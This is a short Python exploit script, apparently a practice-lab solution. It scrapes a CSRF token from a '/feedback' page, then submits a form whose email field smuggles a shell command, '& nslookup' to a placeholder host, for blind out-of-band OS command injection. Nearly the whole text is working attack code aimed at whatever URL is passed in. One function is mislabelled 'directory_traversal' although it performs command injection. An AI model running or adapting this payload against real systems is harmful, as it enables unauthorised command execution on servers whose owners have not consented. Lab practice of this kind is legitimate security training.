import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8087", "https": "http://127.0.0.1:8087"}

def csrf_token(session, url):
    feedback = url + "/feedback"
    res = session.get(feedback, proxies=proxies, verify=False)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.find('input', {"name": "csrf"})
    return csrf.get("value")

def directory_traversal(session, url):
    csrf_token_value = csrf_token(session, url)  # Assign the CSRF token to a different variable
    img_url = url + "/feedback/submit"
    # print(csrf_token_value)
    command_injection = "test@test.com & nslookup your_server_hostname_here #"
    content = {"csrf": csrf_token_value, "name": "test", "email": command_injection, "subject": "test", "message": "test"}
    
    res = session.post(img_url, data=content, verify=False, proxies=proxies)
    
    if res.status_code == 200:
        print("(+) The os command injection exploit succeeded!")
        print(res.text)
    else:
        print("(-) The os command injection exploit failed!")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    session = requests.Session()
    directory_traversal(session, url)
